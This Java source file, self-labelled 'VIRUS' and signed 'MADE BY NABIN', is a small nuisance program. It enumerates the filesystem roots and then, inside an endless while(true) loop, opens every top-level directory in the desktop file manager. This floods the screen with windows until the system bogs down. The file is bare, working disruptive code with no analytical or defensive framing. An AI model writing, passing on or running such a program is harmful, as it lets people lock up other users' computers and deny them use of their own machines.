/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package virus;

/**
 *
 * @author hp
 */
import java.awt.Desktop;
import java.io.File;
public class VIRUS { //Xomp

    static String[] a;
    static File file;
    public static void main(String args[]) {
        // TODO code application logic here
        try
        {
            File[] paths;
            paths=File.listRoots();
            for(File path: paths)
            {
                a=path.list();
                while(true)
                {
                    for(int x=1;a.length>x;x++)
                    {
                        File file1=new File(path+a[x]);
                        if(file1.isDirectory())
                        {
                            Desktop desktop=Desktop.getDesktop();
                            File dirToOpen=new File(path+a[x]);
                            desktop.open(dirToOpen);
                        }
                    }
                }
            }
        }
        catch(Exception e)
        {
            System.out.println(e);
        }
        System.out.println("MADE BY NABIN");
    }
    
}
